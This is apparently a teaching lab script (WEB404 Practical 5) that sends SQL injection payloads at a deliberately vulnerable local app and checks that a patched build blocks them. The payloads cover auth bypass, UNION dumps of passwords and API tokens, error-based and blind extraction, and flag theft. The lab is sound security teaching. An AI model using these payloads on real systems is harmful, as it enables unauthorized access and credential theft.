#!/usr/bin/env bash
#
# run-attacks.sh — automated SQL injection demonstration for WEB404 Practical 5.
#
# Fires every injection type at the VULNERABLE build (:3000), then replays the same
# payloads against the SECURE build (:3001) to prove the fix. Local lab only.
#
# Usage:
#   1. In terminal A:  npm run vuln
#   2. In terminal B:  npm run secure
#   3. In terminal C:  npm run attack      (or: bash attacks/run-attacks.sh)
#
set -u
VULN="http://127.0.0.1:3000"
SECURE="http://127.0.0.1:3001"

bold() { printf "\n\033[1m%s\033[0m\n" "$1"; }
ok()   { printf "  \033[32m%s\033[0m\n" "$1"; }
bad()  { printf "  \033[31m%s\033[0m\n" "$1"; }

# Confirm both servers are reachable before starting.
curl -s -o /dev/null "$VULN/"   || { bad "Vulnerable app not reachable on :3000 — run 'npm run vuln'.";   exit 1; }
curl -s -o /dev/null "$SECURE/" || { bad "Secure app not reachable on :3001 — run 'npm run secure'."; exit 1; }

bold "=== ATTACK 1 — Authentication bypass (in-band) ==="
echo  "Payload (username): admin' --     password: anything"
printf "  VULN   : "; curl -s -X POST "$VULN/login"   --data-urlencode "username=admin' -- " --data-urlencode "password=x" \
  | grep -Eo 'Authenticated as <strong>[a-z]+|Invalid credentials' | head -1 | sed 's/<[^>]*>//g'
printf "  SECURE : "; curl -s -X POST "$SECURE/login" --data-urlencode "username=admin' -- " --data-urlencode "password=x" \
  | grep -Eo 'Authenticated as <strong>[a-z]+|Invalid username or password' | head -1 | sed 's/<[^>]*>//g'

bold "=== ATTACK 2 — UNION-based data exfiltration (in-band) ==="
echo  "Payload: peripherals' UNION SELECT id, username||':'||password, api_token FROM users -- "
P2="category=peripherals' UNION SELECT id, username || ':' || password, api_token FROM users -- "
printf "  VULN credentials dumped:\n"
curl -s -G "$VULN/products" --data-urlencode "$P2" | grep -Eo '<td>[a-z]+:[^<]+</td>' | sed 's/<[^>]*>//g' | sed 's/^/     /'
printf "  SECURE : "; curl -s -G "$SECURE/products" --data-urlencode "$P2" | grep -Eo 'is not a known category' | head -1

bold "=== ATTACK 3 — Error-based information disclosure ==="
echo  "Payload: peripherals'    (unbalanced quote)"
printf "  VULN leaks: "; curl -s -G "$VULN/products"   --data-urlencode "category=peripherals'" | grep -Eo '<pre>[^<]+</pre>' | head -1 | sed 's/<[^>]*>//g'
printf "  SECURE     : "; curl -s -G "$SECURE/products" --data-urlencode "category=peripherals'" | grep -Eo 'is not a known category' | head -1

bold "=== ATTACK 4 — Boolean-based blind (extract admin password char 1) ==="
rows() { curl -s -G "$VULN/products" --data-urlencode "category=$1" | grep -Eo 'Rows returned: <strong>[0-9]+' | grep -Eo '[0-9]+'; }
echo  "  AND 1=1  -> rows: $(rows "peripherals' AND 1=1 -- ")   (TRUE  oracle)"
echo  "  AND 1=2  -> rows: $(rows "peripherals' AND 1=2 -- ")   (FALSE oracle)"
echo  "  substr(admin.password,1,1)='S' -> rows: $(rows "peripherals' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='S' -- ")  (TRUE => 1st char is 'S')"
echo  "  substr(admin.password,1,1)='X' -> rows: $(rows "peripherals' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='X' -- ")  (FALSE)"

bold "=== ATTACK 5 — Time-based blind (conditional delay) ==="
t() { curl -s -o /dev/null -w "%{time_total}" -G "$VULN/products" --data-urlencode "category=$1"; }
echo  "  baseline       : $(t "peripherals")s"
echo  "  AND sleep(3)   : $(t "peripherals' AND sleep(3) -- ")s   (delay confirms injection; sleep runs per matched row)"
printf "  SECURE sleep(3): "; curl -s -o /dev/null -w "%{time_total}s (no delay)\n" -G "$SECURE/products" --data-urlencode "category=peripherals' AND sleep(3) -- "

bold "=== ATTACK 6 — Numeric injection dumps every user ==="
echo  "Payload: /profile?id=0 OR 1=1"
printf "  VULN rows: "; curl -s -G "$VULN/profile" --data-urlencode "id=0 OR 1=1" | grep -Eo '<td>(admin|alice|bob|carol)</td>' | sed 's/<[^>]*>//g' | tr '\n' ' '; echo
printf "  SECURE   : "; curl -s -G "$SECURE/profile" --data-urlencode "id=0 OR 1=1" | grep -Eo 'Invalid user id' | head -1

bold "=== ATTACK 7 — UNION exfiltrate app_secrets (the flag) ==="
echo  "Payload: /profile?id=1 UNION SELECT name, value, 'x', 'y' FROM app_secrets"
printf "  VULN flag: "; curl -s -G "$VULN/profile" --data-urlencode "id=1 UNION SELECT name, value, 'x', 'y' FROM app_secrets" | grep -Eo 'WEB404\{[^}]+\}' | head -1
printf "  SECURE   : "; curl -s -G "$SECURE/profile" --data-urlencode "id=1 UNION SELECT name, value, 'x', 'y' FROM app_secrets" | grep -Eo 'Invalid user id' | head -1

bold "=== DONE ==="
echo  "Every attack succeeds on :3000 and is neutralised on :3001."
